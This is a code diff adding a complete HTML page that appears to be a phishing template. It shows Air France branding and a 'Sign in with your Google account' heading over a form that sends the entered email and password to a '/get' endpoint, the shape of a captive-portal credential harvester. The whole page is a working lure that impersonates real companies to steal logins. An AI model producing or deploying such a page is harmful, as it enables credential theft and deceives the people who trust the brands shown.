@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #FFC72C;
+  margin-right: 100px
+}
+
+.brand-name {
+  font-size: 60px;
+  color: #051039;
+  margin-left: 0px;
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #002C69;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #002C69;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #E2001A;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #E2001A;
+  border: none;
+  color: #000000;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+}
+
+.submit-btn:hover {
+  background: #FFC72C;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="180.000000pt" height="180.000000pt" viewBox="0 0 250.000000 250.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,250.000000) scale(0.100000,-0.100000)"
+fill="#E2001A" stroke="none">
+<path d="M1085 1358 c-127 -183 -252 -357 -280 -386 -58 -62 -111 -96 -177
+-113 -99 -24 -47 -30 245 -27 l292 3 57 28 c32 16 77 47 100 70 24 23 144 189
+267 367 124 179 236 340 249 358 l24 32 -274 0 -274 0 -229 -332z"/>
+</g>
+</svg>
+
+
+
+
+    <div class="brand-name">AIRFRANCE</div>
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in with your <b>Google</b> account</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+      <button class="submit-btn" type="submit"><b>Continue</b></button>
+
+    </form>
+
+  </div>
+
+</div>
+
+</body>
+</html>
